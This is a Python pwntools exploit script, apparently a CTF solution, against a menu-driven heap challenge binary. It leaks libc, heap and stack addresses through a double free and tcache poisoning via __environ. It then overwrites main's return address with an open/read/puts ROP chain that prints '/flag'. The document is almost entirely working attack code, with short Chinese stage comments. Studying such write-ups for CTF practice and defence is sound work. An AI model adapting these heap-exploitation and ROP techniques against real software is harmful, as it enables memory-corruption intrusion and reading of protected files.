#!/usr/bin/python
#coding=utf-8
#__author__:N1K0_

from pwn import *
import inspect
from sys import argv

def leak(var):
    callers_local_vars = inspect.currentframe().f_back.f_locals.items()
    temp =  [var_name for var_name, var_val in callers_local_vars if var_val is var][0]
    p.info(temp + ': {:#x}'.format(var))

s      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))
plt     = lambda data               :elf.plt[data]
got     = lambda data               :elf.got[data]
sym     = lambda data               :libc.sym[data]
itr     = lambda                    :p.interactive()

local_libc  = '/home/cutecabbage/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so'
local_libc_32 = '/lib/i386-linux-gnu/libc.so.6'
remote_libc = ''
binary = './pwn'
context.binary = binary
elf = ELF(binary,checksec=False)

p = process(binary)
if len(argv) > 1:
    if argv[1]=='r':
        p = remote('1',1)
libc = elf.libc
# libc = ELF(remote_libc)

def dbg(cmd=''):
    os.system('tmux set mouse on')
    context.terminal = ['tmux','splitw','-h']
    gdb.attach(p,cmd)
    pause()

"""
chunk_list = 0x40A0 
chunk_list_flag = 0x04060
gender_chance = 0x4010

"""

# start 
# context.log_level = 'DEBUG'

def add(idx,sex,name):
    sla(b'>> ',b'1')
    sla(b'index?\n',str(idx).encode())
    sla(b'2.Girl:\n',str(sex).encode())
    sa(b"Please input your child's name:\n",name)
def name_edit(idx,name):
    sla(b'>> ',b'2')
    sla(b'index',str(idx).encode())
    sa(b'name:',name)
    ru(b'Done!\n')
def show(idx):
    sla(b'>>',b'3')
    sla(b'index?',str(idx).encode())
def free(idx):
    sla(b'>>',b'4')
    sla(b'index?',str(idx).encode())
def change_sex(idx,sex):
    sla(b'>>',b'666')
    sla(b'index?',str(idx).encode())
    ru(b'Current gender:')
    temp = uu64(r(6))
    sla(b'2.Girl:',str(sex).encode())
    return temp
def content_edit(idx,data):
    sla(b'>>',b'5')
    sla(b'index?',str(idx).encode())
    sa(b'description:',data)
def quit():
    sla(b'>>',b'6')

# ---------------------------- 1 构造double free；泄露libc、heap、environ；将堆块申请到environ泄露stack并计算出main ret
for i in range(10):
    add(i,1,b'aaaa')
for i in range(7):
    free(6-i)
free(7)
free(8)
add(0,1,b'aaaa')
free(8)
add(0,1,b'aaaa')
for i in range(1,8):
    add(i,1,b'aaaa')
show(0)
base = uu64(ru(b'\x7f',False)[-6:]) - 0x1ebbe0
environ = base + sym('__environ')
leak(base)
leak(environ)
add(8,1,b'aaaa')
free(9)
free(8)
name_edit(0,p64(environ-0x10)[:-1])
add(8,1,b'aaaa')
add(9,1,b'aaaa')
show(9)
context.log_level = 'DEBUG'
stack_addr = uu64(ru(b'\x7f',False)[-6:])
main_ret = stack_addr - 0x100
leak(stack_addr)
leak(main_ret)

# ----------------------------------------2 利用double和tcache poison，将堆块申请到main ret并布置orw chains
free(7)
free(8)
show(0)
ru(b'Name: ')
heap_addr = uu64(r(6))-0xa10
leak(heap_addr)
name_edit(0,p64(main_ret-0x10)[:-1])
add(8,1,b'/flag\x00\x00')
add(7,1,b'aa')

p_rsi_r = base + 0x27529
p_rdi_r = base + 0x26b72
p_rdx_r12_r = base + 0x11c371
open_addr  = base + sym('open')
read_addr = base + sym('read')
puts = base + sym('puts')
# orw chains
# open
pl = p64(p_rdi_r)+p64(heap_addr+0x0b20)+p64(p_rsi_r)+p64(0)+p64(open_addr)
# read
pl+= p64(p_rdi_r)+p64(4)+p64(p_rsi_r)+p64(heap_addr+0x3d0)+p64(p_rdx_r12_r)+p64(0x30)*2+p64(read_addr)
# puts
pl+= p64(p_rdi_r)+p64(heap_addr+0x3d0)+p64(puts)
content_edit(7,pl)
#------------------------------------------3 trigger
quit()
# end
itr()